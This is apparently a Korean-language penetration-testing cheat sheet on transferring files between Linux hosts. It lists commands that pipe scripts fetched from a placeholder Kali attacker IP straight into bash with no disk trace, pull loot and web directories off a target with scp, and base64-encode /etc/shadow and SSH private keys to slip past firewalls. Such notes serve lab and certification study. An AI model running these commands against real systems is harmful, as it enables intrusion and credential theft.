# Linux_to_Linux

# 파일전송 — Linux → Linux

---

## 공격자 측 서버

```bash
python3 -m http.server 80
python3 -m http.server 8080
python -m SimpleHTTPServer 80    # Python2
```

---

## wget

```bash
wget http://<칼리IP>/linpeas.sh -O /tmp/linpeas.sh
wget http://<칼리IP>/exploit.py -P /tmp/
```

---

## curl

```bash
curl http://<칼리IP>/linpeas.sh -o /tmp/linpeas.sh

# 메모리 직접 실행 (디스크 흔적 없음)
curl http://<칼리IP>/linpeas.sh | bash
wget -O - http://<칼리IP>/linpeas.sh | bash
wget -qO - http://<칼리IP>/linpeas.sh | sh
```

---

## SCP (SSH 자격증명 있을 때)

```bash
# 보내기
scp /local/file.txt user@<타겟IP>:/tmp/

# 가져오기
scp user@<타겟IP>:/tmp/loot.txt ./

# 디렉터리 전체
scp -r user@<타겟IP>:/var/www/html/ ./
```

---

## nc (netcat)

```bash
# 받는 쪽
nc -lvnp 4444 > received_file

# 보내는 쪽
nc <받는쪽IP> 4444 < file_to_send

# 전송 확인 (md5)
md5sum file_to_send
```

---

## base64 (방화벽 우회, 소형 파일)

```bash
# 인코딩
base64 -w0 /etc/shadow
cat id_rsa | base64 -w0

# 디코딩
echo "BASE64STRING" | base64 -d > shadow
echo "BASE64STRING" | base64 -d > id_rsa
chmod 600 id_rsa
```

---

## 쓰기 가능한 경로

```bash
/tmp
/var/tmp
/dev/shm
/run/shm
```